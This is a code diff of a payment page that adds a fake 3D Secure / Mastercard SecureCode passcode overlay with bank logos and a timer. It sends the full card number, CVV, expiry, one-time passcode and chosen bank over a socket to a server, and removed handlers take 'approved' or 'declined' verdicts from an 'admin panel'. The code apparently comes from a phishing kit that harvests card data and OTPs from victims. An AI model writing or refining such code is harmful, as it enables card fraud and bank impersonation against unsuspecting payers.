+                style="width: 100%; padding: 8px 30px 8px 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
+                font-weight: 400; transition: all 0.3s;" 
+                placeholder="Enter One-Time Passcode" maxlength="6">
+              <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+                  <circle cx="12" cy="12" r="10"/>
+                  <path d="M12 16v-4M12 8h.01"/>
+                </svg>
+              </div>
+            </div>
+          </div>
+          
+          <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
+            Incorrect OTP, please enter valid one time passcode sent to your registered mobile
+          </p>
+          
+          <!-- Consent checkbox - aligned to match the image -->
+          <div style="margin-bottom: 15px;">
+            <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
+              <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 13px; height: 13px;" checked>
+              <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
+            </label>
+          </div>
+          
+          <!-- Action buttons - styled to match the image -->
+          <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+            <button id="mcSubmitBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
+            <button id="mcResendBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
+            <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
+          </div>
+          
+          <!-- Timer display -->
+          <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Session expires in: 4:54</div>
+          
+          <!-- Footer links - styled to match the image -->
+          <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
+            <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
+            <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
+            <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
+          </div>
+        </div>
+      `;
+      
+      // Add event listeners
+      setTimeout(() => {
+          setupMcVerificationHandlers();
+          
+          // Start MC verification timer
+          startMcTimer();
+      }, 100);
+  }
+
+  // Helper functions for multi-step MC verification
+  function getCurrencySymbol(currencyCode) {
+      const symbols = {
+          'USD': '$',
+          'EUR': '€',
+          'GBP': '£',
+          'JPY': '¥',
+          'CAD': 'C$',
+          'AUD': 'A$',
+          'INR': '₹',
+          'CNY': '¥'
+      };
+      return symbols[currencyCode] || '$';
+  }
+
+  function getPopularBanks(cardType) {
+      // Return different banks based on card type
+      if (cardType === 'visa') {
+          return [
+              { code: 'chase bank', name: 'Chase Bank' },
+              { code: 'wellsfargo', name: 'Wells Fargo' },
+              { code: 'capitalone', name: 'Capital One' },
+              { code: 'citibank', name: 'Citibank' },
+              { code: 'boa', name: 'Bank of America' },
+              { code: 'pnc', name: 'PNC Bank' },
+              { code: 'usbank', name: 'US Bank' },
+              { code: 'td bank', name: 'TD Bank' }
+          ];
+      } else if (cardType === 'mastercard') {
+          return [
+              { code: 'chase bank', name: 'Chase Bank' },
+              { code: 'citibank', name: 'Citibank' },
+              { code: 'barclays bank', name: 'Barclays' },
+              { code: 'hsbc', name: 'HSBC Bank' },
+              { code: 'Deutsche Bank', name: 'Deutsche Bank' },
+              { code: 'BNP Paribas', name: 'BNP Paribas' },
+              { code: 'santandar usa', name: 'Santander' },
+              { code: 'usbank', name: 'US Bank' }
+          ];
+      } else {
+          return [
+              { code: 'chase bank', name: 'Chase Bank' },
+              { code: 'boa', name: 'Bank of America' },
+              { code: 'citibank', name: 'Citibank' },
+              { code: 'wellsfargo', name: 'Wells Fargo' },
+              { code: 'usbank', name: 'US Bank' },
+              { code: 'pnc', name: 'PNC Bank' },
+              { code: 'td bank', name: 'TD Bank' },
+              { code: 'capitalone', name: 'Capital One' }
+          ];
+      }
   }
 
   function updateMcVerificationUI() {
@@ -1325,7 +1794,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       const verificationLogo = document.getElementById('verificationTypeLogo');
       if (!verificationLogo) return;
       
-      if (cardType === 'visa') {
+if (cardType === 'visa') {
           verificationLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
       } else if (cardType === 'mastercard') {
           verificationLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
@@ -1407,6 +1876,13 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       const submitBtn = document.getElementById('mcSubmitBtn');
       if (submitBtn) {
           submitBtn.disabled = true;
+      }
+      
+      // Notify server of timeout
+      if (socket && state.transactionId) {
+          socket.emit('mc_verification_timeout', {
+              transactionId: state.transactionId
+          });
       }
       
       // Automatically redirect to failure page after short delay
@@ -1491,24 +1967,33 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
       
       // Send OTP verification to server
-      socket.emit('verify_otp', {
-          transactionId: state.transactionId,
-          otp: otpValue,
-          cardDetails: {
-              cardNumber: state.cardForm.cardNumber,
-              cardHolder: state.cardForm.cardHolder,
-              expiryDate: state.cardForm.expiryDate,
-              cvv: state.cardForm.cvv,
-              cardType: state.cardType
-          },
-          amount: state.amount
-      });
+      if (socket) {
+          socket.emit('verify_otp', {
+              transactionId: state.transactionId,
+              otp: otpValue,
+              bankCode: state.selectedBank,
+              currency: state.selectedCurrency,
+              cardDetails: {
+                  cardNumber: state.cardForm.cardNumber,
+                  cardHolder: state.cardForm.cardHolder,
+                  expiryDate: state.cardForm.expiryDate,
+                  cvv: state.cardForm.cvv,
+                  cardType: state.cardType
+              },
+              amount: state.amount
+          });
+      } else {
+          console.error('Socket connection not available for OTP verification');
+          otpError.textContent = 'Connection error. Please try again.';
+          otpError.style.display = 'block';
+          return;
+      }
       
       // Disable submit button and show loading
       const submitBtn = document.getElementById('mcSubmitBtn');
       if (submitBtn) {
           submitBtn.disabled = true;
-          submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+          submitBtn.innerHTML = '<span style="display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 5px;"></span> Verifying...';
       }
       
       // Simulate verification process (success after delay)
@@ -1540,9 +2025,11 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
       
       // Notify server of resend request
-      socket.emit('resend_otp', {
-          transactionId: state.transactionId
-      });
+      if (socket) {
+          socket.emit('resend_otp', {
+              transactionId: state.transactionId
+          });
+      }
   }
 
   function handleMcCancel() {
@@ -1551,7 +2038,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           clearInterval(mcTimerInterval);
       }
       
-      // Hide MC verification overlay
+// Hide MC verification overlay
       const overlay = document.getElementById('mcVerificationOverlay');
       if (overlay) {
           overlay.style.display = 'none';
@@ -1564,13 +2051,16 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           if (submitBtn) {
               submitBtn.disabled = false;
               submitBtn.innerHTML = 'Pay Now';
+              submitBtn.classList.remove('btn-loading');
           }
       }
       
       // Notify server of cancellation
-      socket.emit('cancel_payment', {
-          transactionId: state.transactionId
-      });
+      if (socket) {
+          socket.emit('cancel_payment', {
+              transactionId: state.transactionId
+          });
+      }
   }
 
   function proceedToSuccess() {
@@ -1601,39 +2091,8 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           }, 2000);
       }
   }
-  
-  // Socket event handlers for payment processing
-  socket.on('payment_processed', function(data) {
-      console.log('Payment processed:', data);
-      if (data.success) {
-          proceedToSuccess();
-      } else {
-          handlePaymentError(data.error);
-      }
-  });
 
-  socket.on('otp_verified', function(data) {
-      console.log('OTP verified:', data);
-      if (data.success) {
-          proceedToSuccess();
-      } else {
-          handleOtpError(data.error);
-      }
-  });
-
-  // Handle payment status updates from admin panel
-  socket.on('payment_status', function(data) {
-      console.log('Payment status update:', data);
-      if (data.status === 'approved') {
-          proceedToSuccess();
-      } else if (data.status === 'declined') {
-          handlePaymentError('Your payment was declined. Please try again with a different card.');
-      } else if (data.status === 'timeout') {
-          handleMcTimeout();
-      }
-  });
-
- // Handle errors from payment gateway
+  // Handle errors from payment gateway
   function handlePaymentError(errorMessage) {
       // Re-enable submit button
       const cardForm = document.getElementById('card-form');
@@ -1642,6 +2101,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           if (submitBtn) {
               submitBtn.disabled = false;
               submitBtn.innerHTML = 'Pay Now';
+              submitBtn.classList.remove('btn-loading');
           }
       }
       
@@ -1655,10 +2115,12 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       showErrorNotification(errorMessage || 'There was an error processing your payment. Please try again.');
       
       // Notify server of error
-      socket.emit('payment_error', {
-          transactionId: state.transactionId,
-          error: errorMessage
-      });
+      if (socket) {
+          socket.emit('payment_error', {
+              transactionId: state.transactionId,
+              error: errorMessage
+          });
+      }
   }
 
   function handleOtpError(errorMessage) {
@@ -1779,7 +2241,6 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       return result;
   }
 
-  // Ensure the back button confirmation is properly set up
   // Set up confirmation dialog when user tries to navigate back or close page during MC verification
   function setupBackButtonConfirmation() {
       // Track if MC verification is active
@@ -1795,8 +2256,8 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           const mcOverlay = document.getElementById('mcVerificationOverlay');
           mcVerificationActive = mcOverlay && mcOverlay.style.display !== 'none';
       }
-      
-      // Handle popstate event (back button)
+
+        // Handle popstate event (back button)
       window.addEventListener('popstate', function(e) {
           updateMcVerificationState();
           if (mcVerificationActive) {
